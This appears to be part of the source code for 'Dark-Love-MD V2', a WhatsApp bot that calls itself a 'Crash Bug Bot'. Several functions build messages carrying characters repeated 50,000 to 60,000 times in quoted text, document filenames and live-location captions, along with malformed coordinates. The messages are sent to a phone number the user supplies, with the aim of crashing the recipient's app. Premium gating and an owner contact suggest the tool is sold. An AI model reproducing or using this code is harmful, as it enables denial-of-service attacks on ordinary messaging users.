...
const Darklovemd = fs.readFileSync(`./lib/bdd/Darklovemd.jpg`)
const slayer = fs.readFileSync(`./lib/bdd/slayer.jpg`)
const logo = fs.readFileSync(`./lib/bdd/logo.jpg`)
const Darklovemdv1 = fs.readFileSync(`./Dark-Love-MD V2/Darklovemdv1.jpg`)
const qris = fs.readFileSync(`./Dark-Love-MD V2/qris.jpg`)
const { button } = require("./lib/ngentot.js")
const { ios } = require("./lib/ios.js")
const { andro } = require("./lib/andro.js")
const dokupalsu = fs.readFileSync(`./lib/bdd/zynxzo.apk`)
    // function resize
    let jimp = require("jimp")
...
"jpegThumbnail": fs.readFileSync(`./lib/bdd/logo.jpg`)
},
"nativeFlowMessage": {
"buttons": [
{
  ...
  Zynxzoo.relayMessage(jid, {
    'extendedTextMessage': {
      ...
      'contextInfo': {
        ...
        'participant': jid,
        'quotedMessage': {
          'conversation': 'Welcome To Dark-Love-MD' + 'ꦾ'.repeat(50000)
        },
        'disappearingMode': {
    ...
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          ...
          'body': {
            'text': "Dark-Love-MD V2 CRASH WHATSAPP"
          },
          'footer': {
            'text': 'xp'
          },
...
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./lib/bdd/Darklovemd.jpg`)
},
"nativeFlowMessage": {
"buttons": [
{
...
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    ...
    "fileName": `Dark-Love-MD V2 DOCUMENT`+"ྦྷ".repeat(60000),
            ...
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: '',
                            subtitle: 'Dark-Love-MD',
                        },
                        body: {
                            text: 'Bug Bot',
                        },
                        footer: {
                            text: 'Dark-Love-MD V2 Crash',
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'cta_url',
                                    buttonParamsJson: "{ display_text : 'Dark-Love-MD V2', url : , merchant_url :  }",
                                },
                                {
                                    name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : 'Bug Bot', url : , merchant_url :  }",
                    },
                    {
                      name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : 'Dark-Love-MD V2 Crash', url : , merchant_url :  }",
                                },
                            ],
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `Enjoy Dark-Love-MD V2`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
name: "cta_url",
buttonParamsJson: `{
display_text: '_Dark-Love-MD_𝘾𝙝𝙖𝙣𝙣𝙚𝙡',
url: "${global.tele}",
merchant_url: "${global.tele}"
}`
}],
...
message: {
  "interactiveMessage": {
    ...
    "footer": {
      "text": "Dark-Love-MD V2 X Crash Bug Bot"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
...
if (!text) return replyz(`Usage .${command} 2348122441244`)
...
case 'meki': case 'Darklovemd':  case 'arara': {
if (!isPremium) return replyz(mess.premium)
					...
					interactiveMessage: {
						...
						carouselMessage: {
							cards: [{
								...
								body: {
									text: `*Owner Dark-Love-MD V2 Crash Bug Bot*`
								},
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"Owner","url":"https:\\/\\/wa.me\\/2348122441244?text=Hello+bro+i+need+your+whatsapp+bug+bot","webview_presentation":null}',
									}, ],
								},
							}, {
								header: {
									imageMessage: await (img),
									hasMediaAttachment: true,
								},
								body: {
									text: `*Channel Zynxzo*`
